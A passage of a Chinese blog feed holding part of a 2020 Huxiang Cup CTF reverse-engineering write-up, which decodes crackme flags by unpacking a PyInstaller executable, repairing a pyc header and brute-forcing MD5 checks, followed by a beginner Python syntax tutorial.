class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">26</span>] = &#123;<span class="number">0x2b</span>,<span class="number">0x08</span>,<span class="number">0xa9</span>,<span class="number">0xc8</span>,<span class="number">0x97</span>,<span class="number">0x2f</span>,<span class="number">0xff</span>,<span class="number">0x8c</span>,<span class="number">0x92</span>,<span class="number">0xf0</span>,<span class="number">0xa3</span>,<span class="number">0x89</span>,<span class="number">0xf7</span>,<span class="number">0x26</span>,<span class="number">0x07</span>,<span class="number">0xa4</span>,<span class="number">0xda</span>,<span class="number">0xea</span>,<span class="number">0xb3</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0xdc</span>,<span class="number">0x95</span>,<span class="number">0xab</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag = <span class="number">0</span>;</span><br><span class="line">flag = (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (a[<span class="number">23</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line">cout&lt;&lt;flag;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i&lt;<span class="number">23</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;((((a[i] ^ i) &gt;&gt; 3) | ((a[i-1] ^ (i-1)) &lt;&lt; 5))&amp;0xff)&lt;&lt;endl;</span></span><br><span class="line">    flag = ((((a[i] ^ i) &gt;&gt; <span class="number">3</span>) | ((a[i<span class="number">-1</span>] ^ (i<span class="number">-1</span>)) &lt;&lt; <span class="number">5</span>))&amp;<span class="number">0xff</span>);</span><br><span class="line">cout&lt;&lt;flag;</span><br><span class="line">&#125;</span><br><span class="line">flag = (a[<span class="number">23</span>] &gt;&gt; <span class="number">3</span>) | ((a[<span class="number">22</span>]^<span class="number">22</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line">cout&lt;&lt;flag;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="REMe"><a href="#REMe" class="headerlink" title="REMe"></a>REMe</h2><p>这题啊，图标就是python生成的exe文件，👴题还是做少了，没见过。比赛时👴用exeinfope分析</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150747.png" alt="image-20201107165231582"></p><p>好像是C++写的（被骗了💔）</p><p>后面好像说有一个什么.Zlib之类的东西</p><p>直接打开看看</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150750.png" alt="image-20201107165604303"></p><p>好像也是对比字符串什么的</p><p>用ida打开看看……</p><p>mian()中一堆函数调用🤷‍♂️，都看看，感觉不是用ida打开反汇编的，好像有一些python的相关字符（比赛时没反应过来🤪），直接去百度看看.Zlib是什么，是什么数据压缩的函式库，看不懂就放着了。没想到竟然是python反汇编（🍀生了出来）</p><p>那既然知道是python生成的exe，那就是一套老操作</p><p><code>python2 pyinstxtractor.py ReMe.exe</code>解包</p><p>在那之中找到最像的 ReMe.pyc</p><p>用<code>uncompyle6 -o re.py ReMe.pyc</code>转成py</p><p>pyc转py失败，用其他的试试，用struct.pyc反汇编成py成功了🙃</p><p>猜测可能是文件头损坏，用struct.pyc的文件头加上去</p><p>这里添加一份文件头大全</p><h3 id="文件头大全"><a href="#文件头大全" class="headerlink" title="文件头大全"></a>文件头大全</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">jpg: FF D8 FF</span><br><span class="line">png: <span class="number">89</span> <span class="number">50</span> 4E <span class="number">47</span></span><br><span class="line">gif: <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span></span><br><span class="line">bmp: <span class="number">42</span> 4D</span><br><span class="line">pyc: 03 F3 0D 0A</span><br><span class="line">pyd: 4D 5A <span class="number">90</span> <span class="number">00</span></span><br><span class="line"><span class="built_in">zip</span>: <span class="number">50</span> 4B 03 04 <span class="comment">#ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件</span></span><br><span class="line">rar: <span class="number">52</span> <span class="number">61</span> <span class="number">72</span> <span class="number">21</span></span><br><span class="line">7z: <span class="number">37</span> 7A BC AF <span class="number">27</span> 1C</span><br><span class="line">xls/doc: D0 CF <span class="number">11</span> E0</span><br><span class="line">dwg: <span class="number">41</span> <span class="number">43</span> <span class="number">31</span> <span class="number">30</span></span><br><span class="line">psd: <span class="number">38</span> <span class="number">42</span> <span class="number">50</span> <span class="number">53</span></span><br><span class="line">rtf: 7B 5C <span class="number">72</span> <span class="number">74</span> <span class="number">66</span></span><br><span class="line">xml: 3C 3F <span class="number">78</span> 6D 6C</span><br><span class="line">html: <span class="number">68</span> <span class="number">74</span> 6D 6C 3E</span><br><span class="line">eml: <span class="number">44</span> <span class="number">65</span> 6C <span class="number">69</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">79</span> 2D <span class="number">64</span> <span class="number">61</span> <span class="number">74</span> <span class="number">65</span> 3A</span><br><span class="line">dbx: CF AD <span class="number">12</span> FE C5 FD <span class="number">74</span> 6F</span><br><span class="line">pst: <span class="number">21</span> <span class="number">42</span> <span class="number">44</span> 4E</span><br><span class="line">mdb: <span class="number">53</span> <span class="number">74</span> <span class="number">61</span> 6E <span class="number">64</span> <span class="number">61</span> <span class="number">72</span> <span class="number">64</span> <span class="number">20</span> 4A</span><br><span class="line">wpd: FF <span class="number">57</span> <span class="number">50</span> <span class="number">43</span></span><br><span class="line">eps/ps: <span class="number">25</span> <span class="number">21</span> <span class="number">50</span> <span class="number">53</span> 2D <span class="number">41</span> <span class="number">64</span> 6F <span class="number">62</span> <span class="number">65</span></span><br><span class="line">pdf: <span class="number">25</span> <span class="number">50</span> <span class="number">44</span> <span class="number">46</span> 2D <span class="number">31</span> 2E</span><br><span class="line">qdf: AC 9E BD 8F</span><br><span class="line">pwl: E3 <span class="number">82</span> <span class="number">85</span> <span class="number">96</span></span><br><span class="line">wav: <span class="number">57</span> <span class="number">41</span> <span class="number">56</span> <span class="number">45</span></span><br><span class="line">avi: <span class="number">41</span> <span class="number">56</span> <span class="number">49</span> <span class="number">20</span></span><br><span class="line">ram: 2E <span class="number">72</span> <span class="number">61</span> FD</span><br><span class="line">rm: 2E <span class="number">52</span> 4D <span class="number">46</span></span><br><span class="line">mpg: <span class="number">00</span> <span class="number">00</span> 01 BA <span class="keyword">or</span> <span class="number">00</span> <span class="number">00</span> 01 B3</span><br><span class="line">mov: 6D 6F 6F <span class="number">76</span></span><br><span class="line">asf: <span class="number">30</span> <span class="number">26</span> B2 <span class="number">75</span> 8E <span class="number">66</span> CF <span class="number">11</span></span><br><span class="line">mid: 4D <span class="number">54</span> <span class="number">68</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>直接将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000h: 42 0D 0D 0A 00 00 00 00 70 79 69 30 10 01 00 00 ; B.......pyi0....</span><br></pre></td></tr></table></figure><p>覆盖第一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000010h: 03 F3 0D 0A 00 00 00 00 00 00 00 00 00 00 00 00 ; .?.............</span><br></pre></td></tr></table></figure><p>就可以反汇编了，发现代码是将字符串中的字符逐个运算和一堆md5比较。</p><p>那就从32~127逐个枚举比对写出python暴力脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys, hashlib</span><br><span class="line">check = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">num</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        num = num * <span class="number">3</span> + <span class="number">1</span> <span class="keyword">if</span> num % <span class="number">2</span> <span class="keyword">else</span> num // <span class="number">2</span></span><br><span class="line">        result.append(num)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>): <span class="comment">#&#x27; &#x27;到&#x27;~&#x27; ASCII</span></span><br><span class="line">            ret_list = func(i)</span><br><span class="line">            s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ret_list)):</span><br><span class="line">                s += <span class="built_in">str</span>(ret_list[idx])</span><br><span class="line">                s += <span class="built_in">str</span>(ret_list[(<span class="built_in">len</span>(ret_list) - idx - <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">            md5 = hashlib.md5()</span><br><span class="line">            md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> md5.hexdigest() == check[j]:</span><br><span class="line">                flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You win!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5.hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h2><p>逆向签到题（👴终于有会做的了）用ida打开找到运算函数，直接做与运算就行</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150755.png" alt="image-20201108191655442"></p><p>有一点要注意的是在c++中   <strong>\“</strong>   是代表   <strong>“</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">s = <span class="built_in">str</span>(<span class="string">r&#x27;7d21e&lt;e3&lt;:3;9;ji t r#w&quot;$*&#123;*+*$|,&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    b = s[i]</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(b)^i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">ord</span>(b)^i,s[i])</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h2><p>发现文件并不能用ida调试，分析无果后思路断了暂无思路，看wp也有些😵，先放着巩固一下知识再来回顾。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2020湖湘杯复盘（大概）&quot;&gt;&lt;a href=&quot;#2020湖湘杯复盘（大概）&quot; class=&quot;headerlink&quot; title=&quot;2020湖湘杯复盘（大概）&quot;&gt;&lt;/a&gt;2020湖湘杯复盘（大概）&lt;/h1&gt;&lt;p&gt;还是乐哥🐂🍺啊，差一点ak，甚至拿到一血，👴就</summary>
      
    
    
    
    <category term="reverse ctf" scheme="http://example.com/categories/reverse-ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>python学习python的基础语法</title>
    <link href="http://example.com/2021/08/13/1.python%E5%AD%A6%E4%B9%A0python%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <id>http://example.com/2021/08/13/1.python%E5%AD%A6%E4%B9%A0python%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</id>
    <published>2021-08-13T11:39:43.621Z</published>
    <updated>2021-08-13T07:29:56.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本语法元素"><a href="#基本语法元素" class="headerlink" title="基本语法元素"></a>基本语法元素</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TemConvert.py</span></span><br><span class="line">TempStr = <span class="built_in">input</span>(<span class="string">&quot;请输入带有符号的温度值:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> TempStr[-<span class="number">1</span>] <span class="keyword">in</span> [<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]:</span><br><span class="line">    C = (<span class="built_in">eval</span>(TempStr[<span class="number">0</span>:-<span class="number">1</span>]) - <span class="number">32</span>)/<span class="number">1.8</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;转换后的温度是&#123;:.2f&#125;C&quot;</span>.<span class="built_in">format</span>(C))</span><br><span class="line"><span class="keyword">elif</span> TempStr[-<span class="number">1</span>] <span class="keyword">in</span> [<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]:</span><br><span class="line">        F = <span class="number">1.8</span>*<span class="built_in">eval</span>(TempStr[<span class="number">0</span>:-<span class="number">1</span>])+<span class="number">32</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;转换后的温度是&#123;:.2f&#125;F&quot;</span>.<span class="built_in">format</span>(F))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入格式错误&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="程序的格式框架"><a href="#程序的格式框架" class="headerlink" title="程序的格式框架"></a>程序的格式框架</h2><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a><strong>缩进</strong></h3><p>一行代码开始前的空白区域，表达程序的格式框架</p><p>单程缩进   多层缩进</p><h4 id="严格明确"><a href="#严格明确" class="headerlink" title="严格明确"></a><strong>严格明确</strong></h4><p>缩进是语法的一部分，缩进不正确程序运行错误</p><h4 id="所属关系"><a href="#所属关系" class="headerlink" title="所属关系"></a><strong>所属关系</strong></h4><p>表达代码间包含和层次关系的唯一 手段</p><h4 id="长度一致"><a href="#长度一致" class="headerlink" title="长度一致"></a><strong>长度一致</strong></h4><p>程序内一致即可，一般用4个空格或1个TAB</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TemConvert.py</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h3><p>用来提高代码可读性的辅助性文字，不被执行</p><h4 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a><strong>单行注释</strong></h4><p>以#开头 ,其后内容为注释</p><p>#这里是单行注释</p><h4 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a><strong>多行注释</strong></h4><p>以’’’开头和结尾</p><p>‘’’这是多行注释第一行<br>这是多行注释第二行’’’</p><h1 id="命名与保留字"><a href="#命名与保留字" class="headerlink" title="命名与保留字"></a>命名与保留字</h1><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194140.jpeg" alt="aS5UzR.jpg"></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量采用标识符(名字) 来表示，关联标识符的过程叫命名<br>TempStr是变量名字<br>可以使用等号(=)向变量赋值或修改值, =被称为赋值符号<br>TempStr= “82F” #向变量TempStr赋值’82F”</p><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><p>关联标识符的过程</p><h4 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h4><p>大小写字母、数字、下划线和汉字等字符及组合<br>如:TempStr，Python_Great，这是门Python好课</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>大小写敏感、首字符不能是数字、不与保留字相同<br>Python和python是不同变量，123Python是不合法的</p><p><strong>被编程语言内部定义并保留使用的标识符</strong><br>-Python语言有33个保留字(也叫关键字)<br>if,elif, else, in<br>-保留字是编程语言的基本单词，大小写敏感<br>if是保留字，If是变量</p><h3 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194145.jpeg" alt="aS5rdO.jpg"></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194149.jpeg" alt="aS5oTS.jpg"></p><p>10,011,101</p><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型:"></a>整数类型:</h3><p>10011101</p><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p>“10,011,101”</p><h3 id="列表类型"><a href="#列表类型" class="headerlink" title="列表类型"></a>列表类型</h3><p>[10，011，101]</p><p>由0个或多个字符组成的有序字符序列</p><h4 id="字符串由一对单引号或一对双引号表示"><a href="#字符串由一对单引号或一对双引号表示" class="headerlink" title="字符串由一对单引号或一对双引号表示"></a>字符串由一对单引号或一对双引号表示</h4><p>“请输入带有符号的温度值:”或者‘C’</p><h4 id="字符串是字符的有序序列，可以对其中的字符进行索引"><a href="#字符串是字符的有序序列，可以对其中的字符进行索引" class="headerlink" title="字符串是字符的有序序列，可以对其中的字符进行索引"></a>字符串是字符的有序序列，可以对其中的字符进行索引</h4><p>“请”是”请输入带有符号的温度值:”的第0个字符</p><h3 id="字符串的序号"><a href="#字符串的序号" class="headerlink" title="字符串的序号"></a>字符串的序号</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194152.jpeg" alt="aS5jO0.jpg"></p><h3 id="字符串的使用"><a href="#字符串的使用" class="headerlink" title="字符串的使用"></a>字符串的使用</h3><p><strong>使用[]获取字符串中一个或多个字符</strong></p><h4 id="索引∶"><a href="#索引∶" class="headerlink" title="索引∶"></a>索引∶</h4><p>返回字符串中单个字符     &lt;字符串&gt;[M]<br>“请输入带有符号的温度值:”[0]     或者     TempStr[-1]</p><h4 id="切片"><a href="#切片" class="headerlink" title="切片:"></a>切片:</h4><p>返回字符串中一段字符子串    &lt;字符串&gt;[M:N]<br>“请输入带有符号的温度值:”[1:3]    或者    TempStr[0:-1]</p><p><strong>[0:-1]表示的是从0个字符开始但不到最后一个字符 去掉了最后一个字符</strong></p><p>整数和浮点数都是数字类型</p><p>-整数数学中的整数</p><p>32或者-89</p><p>-浮点数数学中的实数，带有小数部分</p><p>1.8或者-1.8或者-1.0</p><p>由0个或多个数据组成的有序序列<br>-列表使用[]表示，采用逗号)分隔各元素<br>[ ‘F’,’f’]表示两个元素’F’和’f’<br>-使用保留字in判断一个元素是否在列表中<br>TempStr[-1] in[ ‘C’, ‘c’]判断字符串最后一个是否与列表中某个元素相同</p><h2 id="语句与函数"><a href="#语句与函数" class="headerlink" title="语句与函数"></a>语句与函数</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194158.jpeg" alt="aSIPfJ.jpg"></p><h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><h4 id="由赋值符号构成的一行代码"><a href="#由赋值符号构成的一行代码" class="headerlink" title="由赋值符号构成的一行代码"></a>由赋值符号构成的一行代码</h4><p>-赋值语句用来给变量赋予新的数据值<br>C=(eval(TempStr[0:-1])-32)/1.8    #右侧运算结果赋给变量C<br>-赋值语句右侧的数据类型同时作用于变量<br>TempStr=input(“”)     #input()返回一个字符串，TempStr也是字符串</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194204.jpeg" alt="aSIZm6.jpg"></p><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><p>由判断条件决定程序运行方向的语句<br>-使用保留字ifelifelse构成条件判断的分支结构<br>if TempStr[-1] in[‘F’,’f’]:#如果条件为True则执行冒号后语句<br>-每个保留字所在行最后存在一个冒号(:)，语法的一部分<br>冒号及后续缩进用来表示后续语句与条件的所属关系</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194209.jpeg" alt="aSImTO.jpg"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>根据输入参数产生不同输出的功能过程<br>-类似数学中的函数，y = f(x)<br>print(“输入格式错误””)#打印输出“输入格式错误”<br>-函数采用&lt;函数名&gt;(&lt;参数&gt;)方式使用<br>eval(TempStr[0:-1])    #Tempstr[0:-1]是参数</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194214.jpeg" alt="aSI11A.jpg"></p><h2 id="Python程序的输入输出"><a href="#Python程序的输入输出" class="headerlink" title="Python程序的输入输出"></a>Python程序的输入输出</h2><h3 id="输入函数input"><a href="#输入函数input" class="headerlink" title="输入函数input()"></a>输入函数input()</h3><p>从控制台获得用户输入的函数<br>-input()函数的使用格式∶<br>&lt;变量&gt;= input(&lt;提示信息字符串&gt;)<br>-用户输入的信息以字符串类型保存在&lt;变量&gt;中<br>TempStr = input(“请输入”)    #TempStr保存用户输入的信息</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194220.jpeg" alt="aSI8Xt.jpg"></p><h3 id="输出函数print"><a href="#输出函数print" class="headerlink" title="输出函数print()"></a>输出函数print()</h3><p>以字符形式向控制台输出结果的函数<br>-print()函数的基本使用格式:<br>print(&lt;拟输出字符串或字符串变量&gt;)<br>-字符串类型的一对引号仅在程序内部使用，输出无引号<br>print(“输入格式错误”)    #向控制台输出输入格式错误</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194249.jpeg" alt="aSIt78.jpg"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210718194254.jpeg" alt="aSIatg.jpg"></p><h3 id="评估函数eval"><a href="#评估函数eval" class="headerlink" title="评估函数eval()"></a>评估函数eval()</h3><p>去掉参数最外侧引号并执行余下语句的函数<br>-eval()函数的基本使用格式︰<br>eval(&lt;字符串或字符串变量&gt;)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;1+2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;1+2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>( <span class="string">&#x27;print(&quot;Hello&quot;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本语法元素&quot;&gt;&lt;a href=&quot;#基本语法元素&quot; class=&quot;headerlink&quot; title=&quot;基本语法元素&quot;&gt;&lt;/a&gt;基本语法元素&lt;/h1&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    <category term="python语法" scheme="http://example.com/categories/python%E8%AF%AD%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>hello world</title>
    <link href="http://example.com/2021/08/13/hello-world/"/>
    <id>http://example.com/2021/08/13/hello-world/</id>
    <published>2021-08-13T08:53:22.327Z</published>
